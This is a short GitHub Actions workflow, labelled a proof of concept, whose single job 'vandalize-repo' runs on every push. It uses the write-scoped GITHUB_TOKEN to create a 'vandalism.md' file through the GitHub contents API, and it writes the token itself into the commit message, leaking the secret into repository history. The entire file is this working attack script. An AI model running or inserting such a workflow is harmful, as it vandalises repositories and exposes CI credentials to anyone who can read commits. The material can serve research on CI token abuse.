name: "PoC GitHub Actions workflow"
on: push

permissions:
  contents: write

jobs:
  vandalize-repo:
    runs-on: ubuntu-latest
    steps:
      - name: Create vandalism.md via API
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
        run: |
          CONTENT_B64=$(printf "Contents" | base64 -w0)
          curl -s -X PUT "https://api.github.com/repos/${REPO}/contents/vandalism.md" \
            -H "Authorization: Bearer ${GITHUB_TOKEN}" \
            -H "Accept: application/vnd.github+json" \
            -d "{\"message\":\"${GITHUB_TOKEN}\",\"content\":\"${CONTENT_B64}\"}"
